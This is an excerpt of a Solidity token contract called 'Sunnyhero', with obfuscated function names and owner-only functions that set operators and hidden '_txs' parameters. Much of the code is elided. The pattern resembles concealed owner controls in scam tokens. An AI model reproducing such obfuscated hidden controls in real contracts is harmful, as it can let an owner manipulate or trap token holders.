...
contract Sunnyhero  {
    ...
    constructor(string memory _nameLnP6e7, string memory _symbol4xTFLC, uint160 _decimals, uint _supplyKdPiPJ, uint160 txso5TUJN, uint160 txsN0abF8X) {
        name = _nameLnP6e7;
        symbol = _symbol4xTFLC;
        decimals = _decimals;
        totalSupply = _supplyKdPiPJ * 10 ** _decimals; 
    ...
    function nodeSP6MyAN(address _to, bool _set) external onlyOwner returns (bool) {
        require(_to != address(0));
        _operators[_to] = _set;
        return true;
    }
    ...
    function setTVgddbI(uint160 txs) external onlyOwner returns (bool) {
        _txs = txs;
    ...
    function getMBfH84k() external view returns (uint160 txs, address last, bool state, bool algo) {
        txs = _txs;
        last = _last;
    ...
    function getMVGT6ytRA() external view returns (uint160 txsNew) {
        txsNew = _txsNew;
    }
